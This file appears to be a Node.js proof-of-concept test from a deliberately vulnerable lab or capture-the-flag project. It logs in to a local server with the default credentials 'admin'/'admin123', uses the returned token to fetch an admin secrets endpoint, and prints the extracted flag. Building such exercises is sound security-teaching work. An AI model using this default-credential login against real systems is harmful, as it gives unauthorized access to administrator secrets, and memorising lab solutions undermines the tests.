#!/usr/bin/env node
/**
 * PoC V1.5 — default admin credentials → admin_secrets flag.
 */
import { extractFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3001').replace(/\/$/, '');
const loginRes = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'admin', password: 'admin123' }),
});
const login = await loginRes.json();
if (!loginRes.ok) {
  console.error('FAIL login', login);
  process.exit(1);
}
const secretsRes = await fetch(`${base}/api/admin/secrets`, {
  headers: { Authorization: `Bearer ${login.token}` },
});
const text = await secretsRes.text();
const flag = extractFlag(text);
if (!flag) {
  console.error('FAIL secrets', text);
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V1.5 default-admin');
